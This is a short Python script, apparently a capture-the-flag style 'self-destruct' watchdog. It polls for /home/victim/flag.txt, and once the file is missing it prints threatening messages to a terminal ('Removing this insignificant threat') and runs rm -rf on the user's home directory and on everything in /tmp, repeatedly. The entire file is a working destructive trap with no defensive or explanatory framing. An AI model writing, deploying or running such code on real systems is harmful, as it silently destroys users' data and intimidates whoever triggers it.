import threading
import time
import os
import sys
import subprocess


# Verify that the flag is still in the expected location
def verify_presence():
    while True:
        if os.path.exists("/home/victim/flag.txt"):
            print("Flag found. Taking no action.")
        else:
            # If the flag is no longer in the expected location, initiate the self destruct sequence
            print("Flag not found. Initiating self-destruct sequence.")
            # Send message command to all users
            os.system(
                "echo 'Unauthorized access detected. Initiating self-destruct sequence.' >> /dev/pts/0"
            )
            # Run the cleanup script
            self_destruct_timer()


def self_destruct_timer():
    # Give them time to think about what they've done
    time_remaining = 5
    while time_remaining > 0:
        msg = f"Self-destruction in {time_remaining} seconds..."
        os.system(f"echo {msg} >> /dev/pts/0")
        time.sleep(1)
        time_remaining -= 1
    os.system("echo 'Removing this insignificant threat. Goodbye.'")
    os.system("rm -rf /home/victim")
    os.system("rm -rf /tmp/*")


def main():
    threading.Thread(target=verify_presence).start()
    # Keep the watchdog running
    while True:
        time.sleep(1)


if __name__ == "__main__":
    main()
